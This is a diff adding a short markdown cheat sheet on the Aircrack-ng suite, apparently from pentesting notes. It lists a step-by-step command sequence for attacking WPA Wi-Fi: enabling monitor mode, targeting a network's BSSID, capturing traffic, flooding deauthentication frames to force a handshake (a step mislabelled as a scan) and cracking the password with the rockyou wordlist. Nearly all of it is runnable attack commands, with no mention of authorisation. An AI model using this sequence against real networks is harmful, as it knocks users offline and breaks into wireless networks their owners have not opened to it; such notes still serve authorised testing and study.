@@ -1,0 +1,63 @@
+---
+title: Aircrack-ng
+description:  Aircrack-ng is a network software suite consisting of a detector, packet sniffer, WEP and WPA/WPA2-PSK cracker and analysis tool for 802.11 wireless LANs. It works with any wireless network interface controller whose driver supports raw monitoring mode and can sniff 802.11a, 802.11b and 802.11g traffic.
+---
+
+## Capturing wireless handshakes
+
+Commonly used Aircrack-ng tools and commands to capture a wireless handshake
+
+## Airmon-ng
+
+Enable and disable monitor mode on wireless interfaces
+
+1. ##### Kill active processess
+```bash
+sudo airmon-ng check kill
+```
+2. ##### Put wireless card into monitor mode
+```bash
+sudo airmon-ng start wlan0
+```
+##### Turn off monitor mode
+```bash
+sudo airmon-ng stop wlan0mon
+```
+
+## Airodump-ng
+
+Capture raw 802.11 frames
+
+3. ##### Scan for wireless networks
+```bash
+Sudo airodump-ng wlan0mon
+```
+- 'ctrl c' to break
+- Save MAC address, channel, name, etc...
+##### Filter to display target network
+```bash
+Sudo airodump-ng wlan0mon -d <MAC_Address>
+```
+4. ##### Receive and store captures
+```bash
+sudo airodump-ng -w filename -c 2 --bssid 00:11:AB:CD:E5:F8 wlan0mon
+```
+## Aireplay-ng
+
+Inject and replay wireless frames
+
+** Open a new terminal for the following command **
+
+5. ##### Scan for wireless networks
+```bash
+sudo aireplay-ng --deauth 0 -a 00:11:AB:CD:E5:F8 wlan0mon
+```
+
+6. ##### Try a simple crack
+```bash
+aircrack-ng filename-01.cap -w /usr/share/wordlists/rockyou.txt
+```
+
+## Resources
+
+- [https://www.aircrack-ng.org/documentation.html](https://www.aircrack-ng.org/documentation.html)
